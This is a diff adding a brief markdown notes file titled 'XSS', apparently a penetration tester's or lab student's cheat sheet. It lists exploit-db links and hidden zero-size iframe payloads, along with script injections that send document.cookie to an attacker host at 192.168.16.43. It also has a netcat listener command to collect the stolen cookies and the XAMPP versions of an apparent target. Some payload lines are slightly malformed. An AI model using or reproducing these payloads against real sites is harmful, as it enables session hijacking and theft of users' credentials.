@@ -1,0 +1,24 @@
+# XSS
+
+http://www.exploit-db.com/exploits/12593/
+
+http://www.exploit-db.com/exploits/3758/
+
+
+<iframe SRC="http://192.168.16.43:81/report" height = "0" width ="0"></iframe>
+
+<iframe SRC="http://192.168.16.43:81/report" height = "0" width ="0"></iframe>
+
+<iframe SRC="http://10.1.1.224/" height = "0" width ="0"></iframe>
+
+<script>window.location=http://192.168.16.43/?cookie='+document.cookie</script>
+
+<script>new image().src="http://192.168.16.43:/bogus.php?=output="+document.cookie;</script>
+
+nc -nlvp 80
+
+
+XAMPP version
+
+1.7.3 	2.2.14 	5.1.41 	5.3.1
+
